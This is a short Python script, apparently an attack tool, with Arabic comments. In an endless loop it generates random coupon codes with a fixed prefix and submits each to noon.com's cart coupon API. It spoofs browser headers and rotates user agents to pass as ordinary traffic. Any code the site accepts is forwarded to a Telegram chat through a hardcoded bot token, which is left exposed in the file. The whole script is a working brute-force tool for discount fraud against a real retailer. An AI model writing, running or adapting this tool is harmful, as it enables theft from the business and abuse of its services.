import requests
import telebot
import json
from fake_useragent import UserAgent
tok = "8128789997:AAHIE70sQCwEZYPt7p90uLLg5RUHrIYnyxU"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)
import random
import string
def generate_code(prefix, length):
    # الجزء العشوائي من الكود
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    # دمج الجزء الثابت مع الجزء العشوائي
    code = prefix + random_part
    return code

# مثال للاستخدام
prefix = "VO27100-"
T="OP100"
def Test():
    z = generate_code(prefix, 8)
   # z=T
    ua = UserAgent().random
    url = "https://www.noon.com/_svc/cart-v1/coupon"
    
    params = {
      'code': z,
      'showCart': ""
    }
    print(params)
    
    payload = {}
    
    headers = {
      'User-Agent': ua,
      'Accept': "application/json, text/plain, */*",
      'Accept-Encoding': "gzip, deflate, br, zstd",
      'Content-Type': "application/json",
      'sec-ch-ua-mobile': "?1",
      'x-lng': "312205224",
       'x-ab-test': "901,911,951,1021,1091,1101",
      'x-content': "mobile",
      'x-locale': "en-eg",
      'x-platform': "web",
      'x-cms': "v2",
      'x-ecom-zonecode': "EG-CAI-S10",
      'cache-control': "no-cache, max-age=0, must-revalidate, no-store",
      'x-mp': "noon",
      'x-visitor-id': "283f3f4a-47e2-4239-ba74-a23692ac9565",
      'x-lat': "300631437",
      'origin': "https://www.noon.com",
      'sec-fetch-site': "same-origin",
      'sec-fetch-mode': "cors",
      'sec-fetch-dest': "empty",
      'referer': "https://www.noon.com/egypt-ar/cart/",
      'accept-language': "en-US,en;q=0.9",
      'priority': "u=1, i",
    }
    response1 = requests.post(url, params=params, data=json.dumps(payload), headers=headers).text
    #print(response1)
    if "Hurray! You got a discount!" in response1 or "Code valid on select items only" in response1:
        print('Hurray! You got a discount!')
        botA.send_message(chat_id=ch_id, text=z)
    elif 'Coupon is only valid' in response1:
        print('Coupon is not allow your country')
    elif 'Oops! Coupon code invalid' in response1:
        print('Oops! Coupon Error')
while True:
    try:
        Test()
    except:
    	pass
